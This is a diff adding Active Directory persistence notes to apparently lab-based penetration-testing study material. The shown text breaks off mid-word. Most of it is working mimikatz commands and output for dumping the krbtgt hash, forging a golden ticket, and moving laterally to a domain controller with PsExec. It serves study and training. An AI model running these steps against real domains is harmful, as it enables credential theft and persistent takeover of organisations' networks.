@@ -149,3 +149,56 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt exported-kerberos-list-
   ```  
 ## Windows Management Instrumentation
 ## PowerShell Remoting
+
+# Persistance
+## Golden Tickets
+- If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, or golden tickets.
+
+- Running mimikatz with a Domain Admin user and getting krbtgt NTLM hash
+```bat
+mimikatz # privilege::debug
+
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1602875587-2787523311-2599479668
+
+RID : 000001f4 (500)
+User : Administrator
+LM:
+NTLM : e2b475c11da2a0748290d87aa966c327
+
+RID : 000001f5 (501)
+User : Guest
+LM:
+NTLM :
+
+RID : 000001f6 (502)
+User : krbtgt
+LM:
+NTLM : 75b60230a2394a812000dbfad8415965
+...
+```
+- Before generating the golden ticket, we'll delete any existing Kerberos tickets
+- We will supply:
+  - **/sid** -> whoami /user
+  - **/krbtgt** option instead of /rc4 (to indicate we are supplying the password hash)
+  - **/user** with a **fakeuser**,. because the DC trusts anything correctly encrypted by the krbtgt password hash
+  - **/domain**
+  - **/ppt** in order to write the ticket in memory
+  ```bat
+  mimikatz # kerberos::purge
+  
+  mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+  
+  mimikatz # misc::cmd
+  ```
+- With the golden ticket injected into memory, we can launch a new command prompt with **misc::cmd** and again attempt lateral movement with PsExec
+  ```bat
+  C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe
+  ```
+- If we were to connect using PsExec to the IP address of the DC instead of the hostname, we would instead force the use of NTLM authentication and access would be still be blocked.
+
+## Domain Controller Synchronization
+- If we have access to the DC we can obtain the password for all the admin user in the domain.
+- This can be achieved:
+  1. Running Mimikatz
+  2. Stealing a copy of the **NTDS.
